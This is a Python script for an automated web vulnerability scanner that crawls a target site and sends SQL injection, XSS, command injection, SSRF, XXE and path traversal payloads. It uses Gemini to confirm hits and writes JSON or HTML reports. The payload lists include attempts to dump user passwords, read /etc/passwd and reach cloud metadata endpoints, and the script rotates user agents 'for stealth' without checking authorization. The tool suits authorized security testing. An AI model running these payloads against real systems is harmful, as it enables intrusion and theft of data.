import os
import requests
import google.generativeai as genai
import argparse
import time
import json
import ssl
import socket
import threading
import logging
import hashlib
import random
import base64
from urllib.parse import urljoin, urlparse, quote, unquote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from requests.exceptions import RequestException, Timeout, TooManyRedirects
from requests.packages.urllib3.util.retry import Retry
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import dns.resolver
import urllib3
from fake_useragent import UserAgent

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO, 
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('security_scan.log')
    ]
)

# Load Gemini API key
GEMINI_API_KEY = os.getenv('GEMINI_API_KEY')
if not GEMINI_API_KEY:
    logging.error("Missing Gemini API key. Please set the GEMINI_API_KEY environment variable.")
    exit(1)

# Configure Gemini and discover available models
genai.configure(api_key=GEMINI_API_KEY)

def get_available_model():
    """Get an available Gemini model"""
    try:
        # List available models
        models = genai.list_models()
        available_models = []
        
        for model in models:
            if 'generateContent' in model.supported_generation_methods:
                available_models.append(model.name)
                logging.info(f"Available model: {model.name}")
        
        # Try preferred models in order
        preferred_models = [
            'models/gemini-flash-latest',
            'models/gemini-pro-latest', 
            'models/gemini-2.0-flash',
            'models/gemini-2.0-flash-001'
        ]
        
        for model_name in preferred_models:
            if any(model_name in available_model for available_model in available_models):
                logging.info(f"Using model: {model_name}")
                return genai.GenerativeModel(model_name)
        
        # If no preferred models found, use first available
        if available_models:
            logging.info(f"Using first available model: {available_models[0]}")
            return genai.GenerativeModel(available_models[0])
        else:
            logging.error("No available models found with generateContent support")
            return None
            
    except Exception as e:
        logging.error(f"Error discovering models: {e}")
        # Fallback to basic model
        try:
            return genai.GenerativeModel('gemini-pro')
        except:
            logging.critical("No working Gemini model found")
            return None

# Initialize Gemini model
gemini_model = get_available_model()
if not gemini_model:
    logging.warning("Gemini AI analysis will be disabled")
    AI_ENABLED = False
else:
    AI_ENABLED = True
    logging.info("Gemini AI analysis enabled")

# Enhanced thread-safe data structures
SESSION = requests.Session()
REPORT_DATA = {
    'vulnerabilities': [],
    'scan_metadata': {},
    'endpoints_tested': 0,
    'timestamp': time.time()
}
report_lock = threading.Lock()
rate_limiter = threading.Semaphore(value=10)  # Increased for better performance

# Enhanced headers with rotation
ua = UserAgent()
HEADERS = {
    'User-Agent': ua.random,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

# Enhanced retry strategy
retry_strategy = Retry(
    total=3,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["HEAD", "GET", "POST", "OPTIONS"],
    backoff_factor=1,
    respect_retry_after_header=True
)
adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
SESSION.mount("https://", adapter)
SESSION.mount("http://", adapter)

class PayloadManager:
    """Enhanced payload management with dynamic generation"""
    
    def __init__(self):
        self.payload_cache = {}
        
    def get_sql_payloads(self):
        """Comprehensive SQL injection payloads"""
        return [
            # Basic authentication bypass
            "' OR '1'='1'-- -",
            "admin'-- -",
            "' OR 1=1-- -",
            # Union-based
            "' UNION SELECT 1,2,3-- -",
            "' UNION SELECT username,password FROM users-- -",
            # Error-based
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -",
            # Time-based blind
            "' AND SLEEP(5)-- -",
            "'; WAITFOR DELAY '00:00:05'-- -",
            # Boolean-based blind
            "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -",
        ]
    
    def get_xss_payloads(self):
        """Advanced XSS payloads with evasion"""
        return [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            # Evasion techniques
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=\"x\" onerror=\"javascript:alert(1)\">",
            # DOM-based XSS
            "#<script>alert(1)</script>",
            "javascript:alert('XSS')",
            # Advanced payloads
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert('XSS')\">",
        ]
    
    def get_command_injection_payloads(self):
        """Multi-platform command injection payloads"""
        return [
            # Unix/Linux
            "; ls -la",
            "| whoami",
            "`id`",
            "$(uname -a)",
            "&& cat /etc/passwd",
            # Windows
            "& dir",
            "| type config.ini",
            # Blind injection
            "; ping -c 1 localhost",
            "& nslookup example.com",
        ]
    
    def get_ssrf_payloads(self):
        """SSRF testing payloads"""
        return [
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]:80/",
            "file:///etc/passwd",
            "gopher://localhost:25/xHELO%20localhost",
        ]
    
    def get_xxe_payloads(self):
        """XXE injection payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ]

class SecurityScanner:
    """Enhanced security scanner with comprehensive testing"""
    
    def __init__(self, target_url, allow_ai_analysis=True, threads=10):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.allow_ai_analysis = allow_ai_analysis and AI_ENABLED
        self.threads = threads
        self.payload_manager = PayloadManager()
        self.visited_urls = set()
        self.vulnerabilities = []
        self.forms = {}
        self.session = requests.Session()
        self.session.verify = False
        
    def rotate_headers(self):
        """Rotate headers for stealth"""
        HEADERS['User-Agent'] = ua.random
        return HEADERS.copy()
    
    def analyze_with_gemini(self, response_text, vulnerability_type, context=""):
        """Enhanced AI analysis using Gemini"""
        if not self.allow_ai_analysis:
            return False
            
        prompt = f"""
        Analyze this web response for {vulnerability_type} vulnerabilities.
        Context: {context}
        
        Response sample (first 2000 chars):
        {response_text[:2000]}
        
        Look for indicators of successful exploitation such as:
        - Error messages revealing system information
        - Successful command execution output
        - File content disclosure
        - JavaScript execution evidence
        - Database error messages
        
        Respond ONLY with 'TRUE' if vulnerability is confirmed, 'FALSE' if not, or 'UNCLEAR' if uncertain.
        """
        
        try:
            response = gemini_model.generate_content(prompt)
            result = response.text.strip().upper()
            logging.info(f"Gemini analysis result: {result}")
            return result == 'TRUE'
        except Exception as e:
            logging.error(f"Gemini API error: {e}")
            return False
    
    def test_sql_injection(self, url, method='GET', params=None):
        """Comprehensive SQL injection testing"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_sql_payloads():
            try:
                test_params = params.copy() if params else {}
                for param_name in test_params.keys():
                    test_params[param_name] = payload
                
                response = self.session.request(
                    method, 
                    url, 
                    params=test_params if method == 'GET' else None,
                    data=test_params if method == 'POST' else None,
                    headers=self.rotate_headers(),
                    timeout=10,
                    verify=False
                )
                
                # Multiple detection methods
                indicators = [
                    'mysql_fetch_array', 'ORA-', 'SQL syntax', 'PostgreSQL',
                    'Microsoft OLE DB', 'ODBC Driver', 'Unclosed quotation mark'
                ]
                
                if any(indicator in response.text for indicator in indicators):
                    if self.analyze_with_gemini(response.text, "SQL Injection", f"Payload: {payload}"):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': url,
                            'payload': payload,
                            'confidence': 'high'
                        })
                        
            except Exception as e:
                logging.debug(f"SQLi test error: {e}")
                
        return vulnerabilities
    
    def test_xss(self, url, method='GET', params=None):
        """Advanced XSS testing"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_xss_payloads():
            try:
                test_params = params.copy() if params else {}
                for param_name in test_params.keys():
                    test_params[param_name] = payload
                
                response = self.session.request(
                    method, 
                    url, 
                    params=test_params if method == 'GET' else None,
                    data=test_params if method == 'POST' else None,
                    headers=self.rotate_headers(),
                    timeout=10,
                    verify=False
                )
                
                # Check for payload reflection
                if payload in response.text or any(
                    decoded in response.text for decoded in [unquote(payload), base64.b64decode(payload).decode() if payload.startswith('base64:') else '']
                ):
                    if self.analyze_with_gemini(response.text, "XSS", f"Payload reflected: {payload}"):
                        vulnerabilities.append({
                            'type': 'XSS',
                            'url': url,
                            'payload': payload,
                            'confidence': 'medium'
                        })
                        
            except Exception as e:
                logging.debug(f"XSS test error: {e}")
                
        return vulnerabilities
    
    def test_command_injection(self, url, method='GET', params=None):
        """Enhanced command injection testing"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_command_injection_payloads():
            try:
                test_params = params.copy() if params else {}
                for param_name in test_params.keys():
                    test_params[param_name] = payload
                
                response = self.session.request(
                    method, 
                    url, 
                    params=test_params if method == 'GET' else None,
                    data=test_params if method == 'POST' else None,
                    headers=self.rotate_headers(),
                    timeout=10,
                    verify=False
                )
                
                # Command output indicators
                indicators = ['root:', 'uid=', 'gid=', 'groups=', 'Volume in drive', 'Directory of']
                
                if any(indicator in response.text for indicator in indicators):
                    if self.analyze_with_gemini(response.text, "Command Injection", f"Payload: {payload}"):
                        vulnerabilities.append({
                            'type': 'Command Injection',
                            'url': url,
                            'payload': payload,
                            'confidence': 'high'
                        })
                        
            except Exception as e:
                logging.debug(f"Command injection test error: {e}")
                
        return vulnerabilities
    
    def test_ssrf(self, url, method='GET', params=None):
        """SSRF vulnerability testing"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_ssrf_payloads():
            try:
                test_params = params.copy() if params else {}
                for param_name in test_params.keys():
                    test_params[param_name] = payload
                
                response = self.session.request(
                    method, 
                    url, 
                    params=test_params if method == 'GET' else None,
                    data=test_params if method == 'POST' else None,
                    headers=self.rotate_headers(),
                    timeout=10,
                    verify=False
                )
                
                # SSRF success indicators
                indicators = ['EC2', 'amazonaws', 'metadata', 'root:', 'ssh-rsa']
                
                if any(indicator in response.text.lower() for indicator in indicators):
                    vulnerabilities.append({
                        'type': 'SSRF',
                        'url': url,
                        'payload': payload,
                        'confidence': 'medium'
                    })
                        
            except Exception as e:
                logging.debug(f"SSRF test error: {e}")
                
        return vulnerabilities
    
    def test_xxe(self, url):
        """XXE injection testing"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_xxe_payloads():
            try:
                headers = self.rotate_headers()
                headers['Content-Type'] = 'application/xml'
                
                response = self.session.post(
                    url,
                    data=payload,
                    headers=headers,
                    timeout=10,
                    verify=False
                )
                
                if 'root:' in response.text or 'aws' in response.text:
                    vulnerabilities.append({
                        'type': 'XXE',
                        'url': url,
                        'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                        'confidence': 'high'
                    })
                        
            except Exception as e:
                logging.debug(f"XXE test error: {e}")
                
        return vulnerabilities
    
    def test_directory_traversal(self, url, method='GET', params=None):
        """Enhanced directory traversal testing"""
        payloads = [
            '../../../../etc/passwd',
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '....//....//....//....//etc/passwd',
            '../../../../windows/win.ini',
            '..%5c..%5c..%5c..%5cwindows%5cwin.ini'
        ]
        
        vulnerabilities = []
        
        for payload in payloads:
            try:
                test_params = params.copy() if params else {}
                for param_name in test_params.keys():
                    test_params[param_name] = payload
                
                response = self.session.request(
                    method, 
                    url, 
                    params=test_params if method == 'GET' else None,
                    data=test_params if method == 'POST' else None,
                    headers=self.rotate_headers(),
                    timeout=10,
                    verify=False
                )
                
                if 'root:' in response.text or '[boot loader]' in response.text:
                    vulnerabilities.append({
                        'type': 'Directory Traversal',
                        'url': url,
                        'payload': payload,
                        'confidence': 'high'
                    })
                        
            except Exception as e:
                logging.debug(f"Directory traversal test error: {e}")
                
        return vulnerabilities

    def crawl_website(self, base_url, max_depth=3):
        """Enhanced website crawler with form discovery"""
        visited = set()
        queue = [(base_url, 0)]
        parsed_base = urlparse(base_url)

        while queue:
            url, depth = queue.pop(0)
            if url in visited or depth > max_depth:
                continue
                
            visited.add(url)
            
            try:
                response = self.session.get(url, headers=self.rotate_headers(), timeout=10, verify=False)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    parsed_url = urlparse(full_url)
                    
                    if parsed_url.netloc == parsed_base.netloc and full_url not in visited:
                        queue.append((full_url, depth + 1))
                
                # Extract forms
                for form in soup.find_all('form'):
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'GET').upper()
                    form_url = urljoin(url, form_action)
                    
                    # Extract form parameters
                    inputs = {}
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        name = input_tag.get('name')
                        if name:
                            value = input_tag.get('value', 'test')
                            inputs[name] = value
                    
                    if form_url not in visited:
                        visited.add(form_url)
                        # Store form data for testing
                        self.forms[form_url] = {
                            'method': form_method,
                            'inputs': inputs
                        }
                        
            except Exception as e:
                logging.debug(f"Crawling error for {url}: {e}")
                
        return visited

    def subdomain_enumeration(self, domain):
        """Subdomain discovery"""
        subdomains = set()
        wordlist = ['www', 'api', 'admin', 'test', 'dev', 'staging', 'mail', 'ftp', 'blog', 'shop']
        
        for sub in wordlist:
            test_domain = f"{sub}.{domain}"
            try:
                socket.gethostbyname(test_domain)
                subdomains.add(f"https://{test_domain}")
                subdomains.add(f"http://{test_domain}")
            except:
                continue
                
        return subdomains

    def comprehensive_scan(self, endpoints):
        """Run comprehensive security scan"""
        all_vulnerabilities = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_url = {}
            
            for endpoint in endpoints:
                future = executor.submit(self.scan_endpoint, endpoint)
                future_to_url[future] = endpoint
            
            for future in as_completed(future_to_url):
                endpoint = future_to_url[future]
                try:
                    vulnerabilities = future.result()
                    all_vulnerabilities.extend(vulnerabilities)
                except Exception as e:
                    logging.error(f"Scan error for {endpoint}: {e}")
        
        return all_vulnerabilities

    def scan_endpoint(self, endpoint):
        """Scan individual endpoint for multiple vulnerability types"""
        vulnerabilities = []
        
        # Parse parameters from URL
        parsed = urlparse(endpoint)
        params = {}
        if parsed.query:
            params = dict(param.split('=') for param in parsed.query.split('&') if '=' in param)
        
        # Test different vulnerability types
        tests = [
            self.test_sql_injection(endpoint, 'GET', params),
            self.test_xss(endpoint, 'GET', params),
            self.test_command_injection(endpoint, 'GET', params),
            self.test_directory_traversal(endpoint, 'GET', params),
            self.test_ssrf(endpoint, 'GET', params),
        ]
        
        # Add POST testing if it's a form endpoint
        if endpoint in self.forms:
            form_data = self.forms[endpoint]
            tests.extend([
                self.test_sql_injection(endpoint, 'POST', form_data['inputs']),
                self.test_xss(endpoint, 'POST', form_data['inputs']),
                self.test_command_injection(endpoint, 'POST', form_data['inputs']),
            ])
        
        # Collect all vulnerabilities
        for test_result in tests:
            vulnerabilities.extend(test_result)
        
        # Test XXE on endpoints that might accept XML
        if any(keyword in endpoint.lower() for keyword in ['api', 'soap', 'xml', 'rss']):
            vulnerabilities.extend(self.test_xxe(endpoint))
        
        return vulnerabilities

def generate_report(vulnerabilities, format='json', filename='security_report'):
    """Generate comprehensive security report"""
    
    if format == 'json':
        with open(f'{filename}.json', 'w') as f:
            json.dump({
                'scan_date': time.ctime(),
                'total_vulnerabilities': len(vulnerabilities),
                'vulnerabilities': vulnerabilities,
                'summary': {
                    'critical': len([v for v in vulnerabilities if v.get('confidence') == 'high']),
                    'medium': len([v for v in vulnerabilities if v.get('confidence') == 'medium']),
                    'low': len([v for v in vulnerabilities if v.get('confidence') == 'low'])
                }
            }, f, indent=2)
    
    elif format == 'html':
        # Basic HTML report
        html_content = f"""
        <html>
        <head><title>Security Scan Report</title></head>
        <body>
            <h1>Security Scan Report</h1>
            <p>Generated: {time.ctime()}</p>
            <p>Total Vulnerabilities: {len(vulnerabilities)}</p>
            <h2>Vulnerabilities Found:</h2>
            <ul>
        """
        
        for vuln in vulnerabilities:
            html_content += f"""
            <li>
                <strong>{vuln['type']}</strong> - {vuln['url']}<br>
                Payload: {vuln.get('payload', 'N/A')}<br>
                Confidence: {vuln.get('confidence', 'Unknown')}
            </li>
            """
        
        html_content += "</ul></body></html>"
        
        with open(f'{filename}.html', 'w') as f:
            f.write(html_content)

def main():
    parser = argparse.ArgumentParser(description="Advanced AI-Powered Security Scanner")
    parser.add_argument("--target", required=True, help="Target URL to scan")
    parser.add_argument("--crawl", action='store_true', help="Enable website crawling")
    parser.add_argument("--subdomains", action='store_true', help="Enable subdomain enumeration")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--report-format", choices=['json', 'html'], default='json')
    parser.add_argument("--allow-ai-analysis", action='store_true', help="Enable AI analysis")
    parser.add_argument("--output", default="security_report", help="Output filename")
    
    args = parser.parse_args()

    # Validate target
    if not args.target.startswith(('http://', 'https://')):
        logging.error("Invalid URL scheme. Use http:// or https://")
        exit(1)

    # Initialize scanner
    scanner = SecurityScanner(args.target, args.allow_ai_analysis, args.threads)
    
    # Discover endpoints
    endpoints = {args.target}
    
    if args.crawl:
        logging.info("Crawling website...")
        crawled_urls = scanner.crawl_website(args.target)
        endpoints.update(crawled_urls)
        logging.info(f"Found {len(crawled_urls)} URLs through crawling")
    
    if args.subdomains:
        logging.info("Enumerating subdomains...")
        subdomains = scanner.subdomain_enumeration(scanner.base_domain)
        endpoints.update(subdomains)
        logging.info(f"Found {len(subdomains)} subdomains")
    
    # Run comprehensive scan
    logging.info(f"Starting security scan on {len(endpoints)} endpoints...")
    vulnerabilities = scanner.comprehensive_scan(endpoints)
    
    # Generate report
    logging.info(f"Found {len(vulnerabilities)} vulnerabilities")
    generate_report(vulnerabilities, args.report_format, args.output)
    logging.info(f"Report generated: {args.output}.{args.report_format}")

if __name__ == "__main__":
    main()